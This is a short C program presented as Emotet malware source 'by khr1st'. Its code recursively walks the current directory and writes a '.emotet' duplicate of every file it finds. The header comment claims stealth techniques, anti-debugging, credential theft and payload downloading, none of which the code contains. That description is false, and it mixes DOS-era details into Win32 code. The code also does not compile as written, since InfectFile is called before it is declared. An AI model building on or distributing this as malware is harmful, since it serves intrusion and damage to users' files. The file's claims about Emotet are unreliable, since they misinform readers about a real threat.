; =======================================================================>
;  Emotet by khr1st - 2023
;
;  Emotet is a memory-resident trojan malware that primarily spreads through spam emails. 
;  It hides itself using directory stealth techniques (11/12 and 4E/4F) to avoid detection by
;  antivirus software. To avoid triggering heuristic flags in security software, Emotet overwrites
;  part of the decryption routine with garbage and adds instructions to repair it in the header
;  of the program.
;
;  Emotet is designed to steal sensitive information, such as banking credentials and email 
;  addresses. It has been known to download and install additional malware on infected 
;  systems.
;  
;  This virus also includes debugger traps to thwart tracing, making it difficult for security 
;  researchers to analyze its behavior. Emotet is a dangerous and persistent threat that can 
;  cause significant harm to individuals and organizations.
;  
; =======================================================================>

#include <windows.h>
#include <tchar.h>

void InfectDirectory(TCHAR* pszDir)
{
    WIN32_FIND_DATA FindData;
    TCHAR szFile[MAX_PATH];
    _stprintf(szFile, _T("%s\\*.*"), pszDir);

    HANDLE hFind = FindFirstFile(szFile, &FindData);
    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                if (_tcscmp(FindData.cFileName, _T(".")) != 0 &&
                    _tcscmp(FindData.cFileName, _T("..")) != 0)
                {
                    TCHAR szSubDir[MAX_PATH];
                    _stprintf(szSubDir, _T("%s\\%s"), pszDir, FindData.cFileName);
                    InfectDirectory(szSubDir);
                }
            }
            else
            {
                TCHAR szFile[MAX_PATH];
                _stprintf(szFile, _T("%s\\%s"), pszDir, FindData.cFileName);
                InfectFile(szFile);
            }
        } while (FindNextFile(hFind, &FindData));
        FindClose(hFind);
    }
}

void InfectFile(TCHAR* pszFile)
{
    HANDLE hFile = CreateFile(pszFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        DWORD dwFileSize = GetFileSize(hFile, NULL);
        if (dwFileSize != INVALID_FILE_SIZE)
        {
            BYTE* pBuffer = new BYTE[dwFileSize];
            if (pBuffer != NULL)
            {
                DWORD dwBytesRead;
                if (ReadFile(hFile, pBuffer, dwFileSize, &dwBytesRead, NULL))
                {
                    TCHAR szNewFile[MAX_PATH];
                    _stprintf(szNewFile, _T("%s.emotet"), pszFile);

                    HANDLE hNewFile = CreateFile(szNewFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                    if (hNewFile != INVALID_HANDLE_VALUE)
                    {
                        DWORD dwBytesWritten;
                        WriteFile(hNewFile, pBuffer, dwFileSize, &dwBytesWritten, NULL);
                        CloseHandle(hNewFile);
                    }

                    delete[] pBuffer;
                }
            }
        }

        CloseHandle(hFile);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    TCHAR szDirectory[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, szDirectory);
    InfectDirectory(szDirectory);
    return 0;
}
